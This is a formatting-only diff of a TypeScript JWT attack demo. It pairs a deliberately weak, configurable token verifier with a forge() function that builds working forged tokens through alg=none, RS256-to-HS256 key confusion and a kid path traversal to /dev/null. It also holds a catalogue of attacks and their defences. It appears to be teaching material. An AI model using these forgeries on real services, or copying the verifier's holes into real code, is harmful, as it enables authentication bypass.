@@ -55,9 +55,14 @@ export interface JwtTriple {
   signature: string;
 }
 
-export function splitToken(token: string): { header: string; payload: string; signature: string } {
+export function splitToken(token: string): {
+  header: string;
+  payload: string;
+  signature: string;
+} {
   const parts = token.trim().split(".");
-  if (parts.length !== 3) throw new Error("Token must have three dot-separated segments");
+  if (parts.length !== 3)
+    throw new Error("Token must have three dot-separated segments");
   return { header: parts[0]!, payload: parts[1]!, signature: parts[2]! };
 }
 
@@ -74,7 +79,10 @@ export function decodeTriple(token: string): JwtTriple {
  *  Crypto primitives                                                      *
  * ====================================================================== */
 
-async function hmacSha256(keyBytes: Uint8Array, data: string): Promise<Uint8Array> {
+async function hmacSha256(
+  keyBytes: Uint8Array,
+  data: string,
+): Promise<Uint8Array> {
   const key = await crypto.subtle.importKey(
     "raw",
     new Uint8Array(keyBytes),
@@ -123,7 +131,11 @@ async function rsaSha256Sign(
     false,
     ["sign"],
   );
-  const sig = await crypto.subtle.sign("RSASSA-PKCS1-v1_5", key, enc.encode(data));
+  const sig = await crypto.subtle.sign(
+    "RSASSA-PKCS1-v1_5",
+    key,
+    enc.encode(data),
+  );
   return new Uint8Array(sig);
 }
 
@@ -143,7 +155,8 @@ function pemToDer(pem: string): ArrayBuffer {
  *  In a real verifier these would come from a JWKS endpoint.              *
  * ====================================================================== */
 
-let cachedKeys: Promise<{ publicPem: string; privatePem: string }> | null = null;
+let cachedKeys: Promise<{ publicPem: string; privatePem: string }> | null =
+  null;
 
 export function getDemoKeys() {
   if (!cachedKeys) {
@@ -240,12 +253,22 @@ export async function verifyToken(
     } else if (headerAlg === "HS256" || headerAlg === "RS256") {
       effectiveAlg = headerAlg;
     } else {
-      return { valid: false, reason: `unsupported alg ${headerAlg}`, steps, decoded: triple };
+      return {
+        valid: false,
+        reason: `unsupported alg ${headerAlg}`,
+        steps,
+        decoded: triple,
+      };
     }
     steps.push(`trustHeaderAlg=true \u2192 verifying with ${effectiveAlg}`);
   } else {
     if (config.allowedAlgorithms.length === 0) {
-      return { valid: false, reason: "no allowed algorithms configured", steps, decoded: triple };
+      return {
+        valid: false,
+        reason: "no allowed algorithms configured",
+        steps,
+        decoded: triple,
+      };
     }
     if (!config.allowedAlgorithms.includes(headerAlg as Alg)) {
       return {
@@ -260,12 +283,18 @@ export async function verifyToken(
   }
 
   // Signature check
-  const { header: hdrB64, payload: payB64, signature: sigB64 } = splitToken(token);
+  const {
+    header: hdrB64,
+    payload: payB64,
+    signature: sigB64,
+  } = splitToken(token);
   const signingInput = `${hdrB64}.${payB64}`;
 
   if (effectiveAlg === "none") {
     if (sigB64 !== "") {
-      steps.push("alg=none but signature present \u2014 still accepting per config");
+      steps.push(
+        "alg=none but signature present \u2014 still accepting per config",
+      );
     }
     steps.push("signature check skipped (alg=none)");
   } else if (effectiveAlg === "HS256") {
@@ -276,16 +305,30 @@ export async function verifyToken(
     const computed = await hmacSha256(keyBytes, signingInput);
     const provided = b64urlDecodeBytes(sigB64);
     const ok = constantTimeEqual(computed, provided);
-    steps.push(`HS256 verify with public key bytes \u2192 ${ok ? "match" : "mismatch"}`);
+    steps.push(
+      `HS256 verify with public key bytes \u2192 ${ok ? "match" : "mismatch"}`,
+    );
     if (!ok) {
-      return { valid: false, reason: "HS256 signature mismatch", steps, decoded: triple };
+      return {
+        valid: false,
+        reason: "HS256 signature mismatch",
+        steps,
+        decoded: triple,
+      };
     }
   } else if (effectiveAlg === "RS256") {
     const provided = b64urlDecodeBytes(sigB64);
     const ok = await rsaSha256Verify(config.publicPem, signingInput, provided);
-    steps.push(`RS256 verify with public key \u2192 ${ok ? "match" : "mismatch"}`);
+    steps.push(
+      `RS256 verify with public key \u2192 ${ok ? "match" : "mismatch"}`,
+    );
     if (!ok) {
-      return { valid: false, reason: "RS256 signature mismatch", steps, decoded: triple };
+      return {
+        valid: false,
+        reason: "RS256 signature mismatch",
+        steps,
+        decoded: triple,
+      };
     }
   }
 
@@ -300,7 +343,9 @@ export async function verifyToken(
   }
   if (config.expectedAudience) {
     const aud = triple.payload.aud;
-    const matches = Array.isArray(aud) ? aud.includes(config.expectedAudience) : aud === config.expectedAudience;
+    const matches = Array.isArray(aud)
+      ? aud.includes(config.expectedAudience)
+      : aud === config.expectedAudience;
     if (!matches) {
       return {
         valid: false,
@@ -312,7 +357,12 @@ export async function verifyToken(
   }
   if (typeof triple.payload.exp === "number") {
     if (triple.payload.exp * 1000 < Date.now()) {
-      return { valid: false, reason: "token expired (exp in past)", steps, decoded: triple };
+      return {
+        valid: false,
+        reason: "token expired (exp in past)",
+        steps,
+        decoded: triple,
+      };
     }
   }
 
@@ -365,12 +415,12 @@ export async function forge(
 ): Promise<ForgeResult> {
   const triple = decodeTriple(legitimateToken);
   const steps: string[] = [];
-  steps.push(`captured a legit RS256 token for sub=${triple.payload.sub ?? "?"}`);
+  steps.push(
+    `captured a legit RS256 token for sub=${triple.payload.sub ?? "?"}`,
+  );
 
   const tampered = { ...triple.payload, ...newPayloadOverrides };
-  steps.push(
-    `tampered payload: ${JSON.stringify(newPayloadOverrides)}`,
-  );
+  steps.push(`tampered payload: ${JSON.stringify(newPayloadOverrides)}`);
 
   switch (attack) {
     case "alg-none": {
@@ -382,7 +432,8 @@ export async function forge(
       return {
         token,
         steps,
-        technique: "alg=none — verifier that accepts unsigned tokens admits forgery without any key.",
+        technique:
+          "alg=none — verifier that accepts unsigned tokens admits forgery without any key.",
         reference:
           "CVE-2015-9235 (node-jsonwebtoken). https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/",
       };
@@ -398,7 +449,9 @@ export async function forge(
       const sig = await hmacSha256(enc.encode(publicPem), `${h}.${p}`);
       const token = `${h}.${p}.${b64urlEncode(sig)}`;
       steps.push("set header.alg = 'HS256'");
-      steps.push("HMAC-SHA256 the signing input using the public key (PEM bytes) as the secret");
+      steps.push(
+        "HMAC-SHA256 the signing input using the public key (PEM bytes) as the secret",
+      );
       return {
         token,
         steps,
@@ -415,13 +468,19 @@ export async function forge(
       // sequence, then sign HS256 with that file's content. We model it
       // here by setting kid to a path-traversal sentinel and signing with
       // an empty string (the typical content of /dev/null).
-      const header = { alg: "HS256", kid: "../../../../../../dev/null", typ: "JWT" };
+      const header = {
+        alg: "HS256",
+        kid: "../../../../../../dev/null",
+        typ: "JWT",
+      };
       const h = b64urlEncode(JSON.stringify(header));
       const p = b64urlEncode(JSON.stringify(tampered));
       const sig = await hmacSha256(enc.encode(""), `${h}.${p}`);
       const token = `${h}.${p}.${b64urlEncode(sig)}`;
       steps.push("set header.kid to '../../../../../../dev/null'");
-      steps.push("verifier file-loads kid as the HMAC key \u2192 zero-byte key");
+      steps.push(
+        "verifier file-loads kid as the HMAC key \u2192 zero-byte key",
+      );
       steps.push("HMAC-SHA256 the signing input with empty-string key");
       return {
         token,
@@ -507,6 +566,7 @@ export const ATTACKS: AttackEntry[] = [
       "Rewrite the payload (e.g. flip role to admin), keep the original header + signature. Catches verifiers that decode-but-don't-verify, a real bug in several early SaaS SDKs.",
     defenseToggle: "trustHeaderAlg", // any verify enforcement defeats this
     defenseLabel: "verify before reading claims",
-    reference: "https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html",
+    reference:
+      "https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html",
   },
 ];
